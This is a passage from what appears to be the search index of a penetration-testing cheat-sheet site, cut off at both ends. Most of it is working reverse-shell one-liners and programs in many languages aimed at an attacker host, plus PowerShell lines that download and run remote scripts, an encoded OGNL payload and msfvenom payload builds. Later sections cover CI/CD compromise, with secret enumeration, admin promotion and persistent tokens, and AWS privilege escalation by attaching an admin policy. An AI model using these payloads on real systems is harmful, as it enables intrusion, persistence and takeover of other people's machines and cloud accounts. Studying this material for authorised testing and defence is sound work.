10.0.0.1 4242 -e /bin/bash\nncat --udp 10.0.0.1 4242 -e /bin/bash\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#openssl","title":"OpenSSL","text":"<p>Attacker: <pre><code>user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nuser@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242\nor\nuser@attack$ ncat --ssl -vv -l -p 4242\n\nuser@victim$ mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.0.0.1:4242 &gt; /tmp/s; rm /tmp/s\n</code></pre></p> <p>TLS-PSK (does not rely on PKI or self-signed certificates) <pre><code># generate 384-bit PSK\n# use the generated string as a value for the two PSK variables from below\nopenssl rand -hex 48 \n# server (attacker)\nexport LHOST=\"*\"; export LPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT\n# client (victim)\nexport RHOST=\"10.0.0.1\"; export RPORT=\"4242\"; export PSK=\"replacewithgeneratedpskfromabove\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i &lt; $PIPE 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT &gt; $PIPE; rm $PIPE\n</code></pre></p>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#powershell","title":"Powershell","text":"<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre> <pre><code>powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> <pre><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#awk","title":"Awk","text":"<pre><code>awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4242\"; while(42) { do{ printf \"shell&gt;\" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#java","title":"Java","text":"<pre><code>Runtime r = Runtime.getRuntime();\nProcess p = r.exec(\"/bin/bash -c 'exec 5&lt;&gt;/dev/tcp/10.0.0.1/4242;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done'\");\np.waitFor();\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#java-alternative-1","title":"Java Alternative 1","text":"<pre><code>String host=\"127.0.0.1\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#java-alternative-2","title":"Java Alternative 2","text":"<p>NOTE: This is more stealthy</p> <pre><code>Thread thread = new Thread(){\n    public void run(){\n        // Reverse shell here\n    }\n}\nthread.start();\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#telnet","title":"Telnet","text":"<pre><code>In Attacker machine start two listeners:\nnc -lvp 8080\nnc -lvp 8081\n\nIn Victime machine run below command:\ntelnet &lt;Your_IP&gt; 8080 | /bin/sh | telnet &lt;Your_IP&gt; 8081\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#war","title":"War","text":"<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war &gt; reverse.war\nstrings reverse.war | grep jsp # in order to get the name of the file\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#lua","title":"Lua","text":"<p>Linux only</p> <pre><code>lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"\n</code></pre> <p>Windows and Linux</p> <pre><code>lua5.1 -e 'local host, port = \"10.0.0.1\", 4242 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#nodejs","title":"NodeJS","text":"<pre><code>(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect(4242, \"10.0.0.1\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application from crashing\n})();\n\n\nor\n\nrequire('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')\n\nor\n\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')\n\nor\n\nhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#ognl","title":"OGNL","text":"<pre><code>(#a='echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg== | base64 -d | bash -i').(#b={'bash','-c',#a}).(#p=new java.lang.ProcessBuilder(#b)).(#process=#p.start())\n</code></pre> <p>With <code>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80MjQyIDA+JjEnCg==</code> decoding to <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1'</code>, the payload within the single quotes might be changed by any Linux-compatible reverse shell.</p>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#groovy","title":"Groovy","text":"<p>by frohoff NOTE: Java reverse shell also work for Groovy</p> <pre><code>String host=\"10.0.0.1\";\nint port=4242;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#groovy-alternative-1","title":"Groovy Alternative 1","text":"<p>NOTE: This is more stealthy</p> <pre><code>Thread.start {\n    // Reverse shell here\n}\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#c","title":"C","text":"<p>Compile with <code>gcc /tmp/shell.c --output csh &amp;&amp; csh</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\n\nint main(void){\n    int port = 4242;\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"10.0.0.1\");\n\n    connect(sockt, (struct sockaddr *) &amp;revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"/bin/sh\", NULL};\n    execve(\"/bin/sh\", argv, NULL);\n\n    return 0;       \n}\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#dart","title":"Dart","text":"<pre><code>import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"10.0.0.1\", 4242).then((socket) {\n    socket.listen((data) {\n      Process.start('powershell.exe', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#meterpreter-shell","title":"Meterpreter Shell","text":""},{"location":"cheatsheets/shell-reverse-cheatsheet/#windows-staged-reverse-tcp","title":"Windows Staged reverse TCP","text":"<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#windows-stageless-reverse-tcp","title":"Windows Stageless reverse TCP","text":"<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe &gt; reverse.exe\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#linux-staged-reverse-tcp","title":"Linux Staged reverse TCP","text":"<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#linux-stageless-reverse-tcp","title":"Linux Stageless reverse TCP","text":"<pre><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf &gt;reverse.elf\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#other-platforms","title":"Other platforms","text":"<pre><code>$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f elf &gt; shell.elf\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f exe &gt; shell.exe\n$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f macho &gt; shell.macho\n$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f asp &gt; shell.asp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.jsp\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f war &gt; shell.war\n$ msfvenom -p cmd/unix/reverse_python LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.py\n$ msfvenom -p cmd/unix/reverse_bash LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.sh\n$ msfvenom -p cmd/unix/reverse_perl LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.pl\n$ msfvenom -p php/meterpreter_reverse_tcp LHOST=\"10.0.0.1\" LPORT=4242 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo '&lt;?php ' | tr -d '\\n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#spawn-tty-shell","title":"Spawn TTY Shell","text":"<p>In order to catch a shell, you need to listen on the desired port. <code>rlwrap</code> will enhance the shell, allowing you to clear the screen with <code>[CTRL] + [L]</code>.</p> <pre><code>rlwrap nc 10.0.0.1 4242\n\nrlwrap -r -f . nc 10.0.0.1 4242\n-f . will make rlwrap use the current history file as a completion word list.\n-r Put all words seen on in- and output on the completion list.\n</code></pre> <p>Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.</p> <p> OhMyZSH might break this trick, a simple <code>sh</code> is recommended</p> <p>The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect</p> <pre><code>ctrl+z\necho $TERM &amp;&amp; tput lines &amp;&amp; tput cols\n\n# for bash\nstty raw -echo\nfg\n\n# for zsh\nstty raw -echo; fg\n\nreset\nexport SHELL=bash\nexport TERM=xterm-256color\nstty rows &lt;num&gt; columns &lt;cols&gt;\n</code></pre> <p>or use <code>socat</code> binary to get a fully tty reverse shell</p> <pre><code>socat file:`tty`,raw,echo=0 tcp-listen:12345\n</code></pre> <p>Alternatively, <code>rustcat</code> binary can automatically inject the TTY shell command.</p> <p>The shell will be automatically upgraded and the TTY size will be provided for manual adjustment. Not only that, upon exiting the shell, the terminal will be reset and thus usable.</p> <pre><code>stty raw -echo; stty size &amp;&amp; rcat l -ie \"/usr/bin/script -qc /bin/bash /dev/null\" 6969 &amp;&amp; reset\n</code></pre> <p>Spawn a TTY shell from an interpreter</p> <pre><code>/bin/sh -i\npython3 -c 'import pty; pty.spawn(\"/bin/sh\")'\npython3 -c \"__import__('pty').spawn('/bin/bash')\"\npython3 -c \"__import__('subprocess').call(['/bin/bash'])\"\nperl -e 'exec \"/bin/sh\";'\nperl: exec \"/bin/sh\";\nperl -e 'print `/bin/bash`'\nruby: exec \"/bin/sh\"\nlua: os.execute('/bin/sh')\n</code></pre> <ul> <li>vi: <code>:!bash</code></li> <li>vi: <code>:set shell=/bin/bash:shell</code></li> <li>nmap: <code>!sh</code></li> <li>mysql: <code>! bash</code></li> </ul> <p>Alternative TTY method</p> <pre><code>www-data@debian:/dev/shm$ su - user\nsu: must be run from a terminal\n\nwww-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null\nwww-data@debian:/dev/shm$ su - user\nPassword: P4ssW0rD\n\nuser@debian:~$ \n</code></pre>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#fully-interactive-reverse-shell-on-windows","title":"Fully interactive reverse shell on Windows","text":"<p>The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.</p> <p>ConPtyShell uses the function CreatePseudoConsole(). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).</p> <p>Server Side:</p> <pre><code>stty raw -echo; (stty size; cat) | nc -lvnp 3001\n</code></pre> <p>Client Side:</p> <pre><code>IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001\n</code></pre> <p>Offline version of the ps1 available at --&gt; https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1</p>"},{"location":"cheatsheets/shell-reverse-cheatsheet/#references","title":"References","text":"<ul> <li>Reverse Bash Shell One Liner</li> <li>Pentest Monkey - Cheat Sheet Reverse shell</li> <li>Spawning a TTY Shell</li> <li>Obtaining a fully interactive shell</li> </ul>"},{"location":"cheatsheets/source-code-management-ci/","title":"Source Code Management &amp; CI/CD Compromise","text":""},{"location":"cheatsheets/source-code-management-ci/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Enumerate repositories files and secrets</li> <li>Personal Access Token</li> <li>Gitlab CI/Github Actions</li> <li>References</li> </ul>"},{"location":"cheatsheets/source-code-management-ci/#tools","title":"Tools","text":"<ul> <li>synacktiv/nord-stream - List the secrets stored inside CI/CD environments and extract them by deploying malicious pipelines</li> <li>xforcered/SCMKit - Source Code Management Attack Toolkit</li> </ul>"},{"location":"cheatsheets/source-code-management-ci/#enumerate-repositories-files-and-secrets","title":"Enumerate repositories files and secrets","text":"<p>Using SCMKit - Source Code Management Attack Toolkit</p> <ul> <li>Discover repositories being used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local\n</code></pre></li> <li>Search for repositories by repository name in a particular SCM system     <pre><code>SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o \"some search term\"\nSCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.something.local -o \"some search term\"\n</code></pre></li> <li>Search for code containing a given keyword in a particular SCM system     <pre><code>SCMKit.exe -s github -m searchcode -c userName:password -u https://github.something.local -o \"some search term\"\nSCMKit.exe -s github -m searchcode -c apikey -u https://github.something.local -o \"some search term\"\n</code></pre></li> <li>Search for files in repositories containing a given keyword in the file name in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m searchfile -c userName:password -u https://gitlab.something.local -o \"some search term\"\nSCMKit.exe -s gitlab -m searchfile -c apikey -u https://gitlab.something.local -o \"some search term\"\n</code></pre></li> <li>List snippets owned by the current user in GitLab     <pre><code>SCMKit.exe -s gitlab -m listsnippet -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listsnippet -c apikey -u https://gitlab.something.local\n</code></pre></li> <li>List all GitLab runners available to the current user in GitLab     <pre><code>SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local\nSCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local\n</code></pre></li> <li>Get the assigned privileges to an access token being used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local\n</code></pre></li> <li>Promote a normal user to an administrative role in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName\n</code></pre></li> <li>Create/List/Delete an access token to be used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName\nSCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID\nSCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser\nSCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser\n</code></pre></li> <li>Create/List an SSH key to be used in a particular SCM system     <pre><code>SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o \"ssh public key\"\nSCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o \"ssh public key\"\nSCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local\nSCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local\nSCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID\nSCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID\n</code></pre></li> </ul>"},{"location":"cheatsheets/source-code-management-ci/#personal-access-token","title":"Personal Access Token","text":"<p>Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.</p> <pre><code>curl -k --request POST --header \"PRIVATE-TOKEN: apiToken\" --data \"name=user-persistence-token\" --data \"expires_at=\" --data \"scopes[]=api\" --data \"scopes[]=read_repository\" --data \"scopes[]=write_repository\" \"https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens\"\n</code></pre>"},{"location":"cheatsheets/source-code-management-ci/#gitlab-cigithub-actions","title":"Gitlab CI/Github Actions","text":"<ul> <li>Gitlab-CI \"Command Execution\" example: <code>.gitlab-ci.yml</code> <pre><code>stages:\n    - test\n\ntest:\n    stage: test\n    script:\n        - |\n            whoami\n    parallel:\n        matrix:\n            - RUNNER: VM1\n            - RUNNER: VM2\n            - RUNNER: VM3\n    tags:\n        - ${RUNNER}\n</code></pre></li> <li>Github Action \"Command Execution\" example: <code>.github/workflows/example.yml</code> <pre><code>name: example\non:\n  workflow_dispatch:\n  push:\n    branches: [ main ]\n  pull_request:\n    branches: [ main ]\n\njobs:\n  build:\n    runs-on: windows-2019\n\n    steps:\n      - name: Execute\n        run: |\n          whoami\n</code></pre></li> </ul>"},{"location":"cheatsheets/source-code-management-ci/#references","title":"References","text":"<ul> <li>Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022</li> <li>CI/CD SECRETS EXTRACTION, TIPS AND TRICKS - Hugo Vincent, Th\u00e9o Louis-Tisserand - 01/03/2023</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/","title":"Cloud - AWS","text":""},{"location":"cloud/aws/AWS%20Pentest/#awsome-pentesting-cheatsheet","title":"AWSome Pentesting Cheatsheet","text":"<ul> <li>Created by pop3ret</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#arn","title":"ARN","text":"<p>A number to identify an object in AWS</p> <p>Example</p> <pre><code>arn:aws:iam:100:user/admin\n</code></pre> <ol> <li>Field -&gt; ARN</li> <li>Field -&gt; Type, most of time will be AWS</li> <li>Field -&gt; service, in this case IAM</li> <li>Field -&gt; User ID </li> <li>Field -&gt; entity identifier</li> </ol>"},{"location":"cloud/aws/AWS%20Pentest/#iam","title":"IAM","text":"<ul> <li>It's assumed that we have gain access to the AWS Credentials</li> <li>We can see if we have permissions using Amazon's policy simulator</li> <li>Always look for policies and roles with the * symbol.</li> <li>See which user do not have MFA enabled</li> <li>User enumeration in IAM Panel and group enumeration</li> <li>We can also enumerate roles from the same interface</li> <li>Root user is super admin</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#configure-aws-cli","title":"Configure AWS cli","text":"<pre><code>aws configure\n</code></pre> <p>Or configure it using a profile</p> <pre><code>aws configure --profile example_name\n</code></pre> <p>The credential file is located in <code>~/.aws/credentials</code></p>"},{"location":"cloud/aws/AWS%20Pentest/#listing-iam-access-keys","title":"Listing IAM access Keys","text":"<pre><code>aws iam list-access-keys\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#1-enumerating-iam-users","title":"1. Enumerating IAM users","text":""},{"location":"cloud/aws/AWS%20Pentest/#checking-credentials-for-the-user","title":"Checking credentials for the user","text":"<pre><code>aws sts get-caller-identity\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-iam-users","title":"Listing IAM Users","text":"<pre><code>aws iam list-users\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-the-iam-groups-that-the-specified-iam-user-belongs-to","title":"Listing the IAM groups that the specified IAM user belongs to","text":"<pre><code>aws iam list-groups-for-user --user-name user-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-managed-policies-that-are-attached-to-the-specified-iam-user","title":"Listing all managed policies that are attached to the specified IAM user","text":"<pre><code>aws iam list-attached-user-policies --user-name user-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-user","title":"Listing the names of the inline policies embedded in the specified IAM user","text":"<pre><code>aws iam list-user-policies --user-name user-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#2-enumerating-groups-iam","title":"2. Enumerating Groups IAM","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-iam-groups","title":"Listing IAM Groups","text":"<pre><code>aws iam list-groups\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-managed-policies-that-are-attached-to-the-specified-iam-group","title":"Listing all managed policies that are attached to the specified IAM Group","text":"<pre><code>aws iam list-attached-group-policies --group-name group-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-group","title":"Listing the names of the inline policies embedded in the specified IAM Group","text":"<pre><code>aws iam list-group-policies --group-name group name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#3-enumerating-roles","title":"3. Enumerating Roles","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-iam-roles","title":"Listing IAM Roles","text":"<pre><code>aws iam list-roles\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-all-managed-policies-that-are-attached-to-the-specified-iam-role","title":"Listing all managed policies that are attached to the specified IAM role","text":"<pre><code>aws iam list-attached-role-policies --role-name role-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-the-names-of-the-inline-policies-embedded-in-the-specified-iam-role","title":"Listing the names of the inline policies embedded in the specified IAM role","text":"<pre><code>aws iam list-role-policies --role-name role-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#4-enumerating-policies","title":"4. Enumerating Policies","text":""},{"location":"cloud/aws/AWS%20Pentest/#listing-of-iam-policies","title":"Listing of IAM Policies","text":"<pre><code>aws iam list-policies\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-information-about-the-specified-managed-policy","title":"Retrieving information about the specified managed policy","text":"<pre><code>aws iam get-policy --policy-arn policy-arn\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-information-about-the-versions-of-the-specified-manages-policy","title":"Listing information about the versions of the specified manages policy","text":"<pre><code>aws iam list-policy-versions --policy-arn policy-arn\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-information-about-the-specific-version-of-the-specified-managed-policy","title":"Retrieving information about the specific version of the specified managed policy","text":"<pre><code>aws iam get-policy-version --policy-arn policy-arn --version-id version-id\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#retrieving-the-specified-inline-policy-document-that-is-embedded-on-the-specified-iam-user-group-role","title":"Retrieving the specified inline policy document that is embedded on the specified IAM user / group / role","text":"<pre><code>aws iam get-user-policy --user-name user-name --policy-name policy-name\n\naws iam get-group-policy --group-name group-name --policy-name policy-name\n\naws iam get-role-policy --role-name role-name --policy-name policy-name\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#5-exploitation-scenario","title":"5. Exploitation Scenario","text":""},{"location":"cloud/aws/AWS%20Pentest/#general-guidelines","title":"General Guidelines","text":"<ul> <li>AWS token compromised (Developer machine, phishing etc) and we as attackers will gonna use it. </li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#enumerating-the-owner-of-the-key-and-initial-compromise","title":"Enumerating the owner of the key and initial compromise","text":"<pre><code>aws sts get-caller-identity\n</code></pre> <p>Or specifing a profile</p> <pre><code>aws sts get-caller-identity --profile example_name\n</code></pre> <p>If you have the password of the root account instead of key, log in</p> <pre><code>https://signin.aws.amazon.com/console\n</code></pre> <p>Or use the IAM in case the account is not the root</p> <pre><code>https://account-id-here.signin.aws.amazon.com/console\n</code></pre> <p>The account id can be cathered using the sts get caller command.</p>"},{"location":"cloud/aws/AWS%20Pentest/#privilege-escalation","title":"Privilege Escalation","text":"<ul> <li>Privilege escalation on AWS is based on misconfigurations, if we have more permissions than necessary, its possible to obtain higher privileges.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#study-case","title":"Study Case","text":"<ul> <li>A user was compromised with the List Policy and Put User Policy permissions, an attacker could leverage this Put User privilege to add an inline administrator to itself, making it administrator of the instance.</li> </ul>"},{"location":"cloud/aws/AWS%20Pentest/#exploitation","title":"Exploitation","text":"<ol> <li>Getting the IAM user</li> </ol> <pre><code>aws sts get-caller-identity\n</code></pre> <ol> <li>Listing policies attached to a user</li> </ol> <pre><code>aws iam list-attached-user-policies --user-name example_name -- profile example_profile\n</code></pre> <ol> <li>Retrieving information about a specific policy</li> </ol> <pre><code>aws iam get-policy --policy-arn policy_arn\n</code></pre> <p>If there are more than one version of the policy, we can also list them</p> <pre><code>aws iam list-policy-versions --policy-arn policy_arn\n</code></pre> <p>Now we can finally retrieve the contents of the policy</p> <pre><code>aws iam get-policy-version --policy-arn example_arn --version-id id_example\n</code></pre> <p>It's important to use the command above to check the information about the default policy</p> <ol> <li>Escalation</li> </ol> <p>If we have the PutUserPolicy is enabled, we can add an inline administrator policy to our user. </p> <p>Administrator policy example</p> <pre><code>{\n    \"Version\": \"2021-10-17\",\n    \"Statement\" : [\n        {\n            \"Effect\":\"Allow\",\n            \"Action\": [\n                \"*\"\n            ],\n            \"Resource\":[\n                \"*\"\n            ]\n        }\n    ]\n}\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#attaching-this-policy-into-our-user","title":"Attaching this policy into our user","text":"<pre><code>aws iam put-user-policy --user-name example_username --policy-name example_name --policy-document file://AdminPolicy.json\n</code></pre>"},{"location":"cloud/aws/AWS%20Pentest/#listing-inline-policies-of-our-user","title":"Listing 